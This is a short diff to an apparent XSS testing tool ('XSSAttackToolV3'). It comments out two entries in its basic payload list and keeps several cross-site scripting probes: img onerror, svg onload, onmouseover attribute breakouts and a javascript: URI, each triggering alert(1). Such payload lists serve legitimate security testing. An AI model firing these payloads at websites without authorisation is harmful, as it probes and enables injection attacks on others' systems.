@@ -256,13 +256,13 @@ class XSSAttackToolV3:
         print(f"\n{Fore.CYAN}[*] Running Basic XSS Test...{Style.RESET_ALL}")
         
         payloads = [
-            '<script>alert(1)</script>',
+            # '<script>alert(1)</script>',
             '<img src=x onerror=alert(1)>',
             '<svg onload=alert(1)>',
             '" onmouseover="alert(1)" x="',
             "' onmouseover='alert(1)' x='",
             'javascript:alert(1)',
-            '<iframe src=javascript:alert(1)>'
+            # '<iframe src=javascript:alert(1)>'
         ]
         
         for payload in payloads:
